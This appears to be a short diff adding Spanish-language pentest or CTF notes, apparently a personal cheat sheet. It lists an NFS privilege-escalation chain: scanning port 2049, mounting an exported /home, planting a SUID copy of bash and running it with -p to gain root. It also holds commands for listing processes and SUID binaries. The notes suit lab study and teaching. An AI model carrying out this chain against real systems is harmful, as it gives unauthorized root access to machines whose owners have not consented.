@@ -1,0 +1,3 @@
+nmap -p 2049 -sCV IP -> apt install nfs-common -> showmount -e IP -> mkdir /tmp/nfs -> mount -t nfs IP:/home /tmp/nfs -> sudo cp /bin/bash . -> sudo chmod +s bash ->  ssh -l usuario IP (posteriormente con gftobins vemos que bash con el bit suid activado y permisos de root al ejecutarlo con ./bash -p nos convertimos en root).
+ps -ef (para ver los procesos activos)
+find / -perm -4000 -ls 2>/dev/null (para ver los bin con SUID)
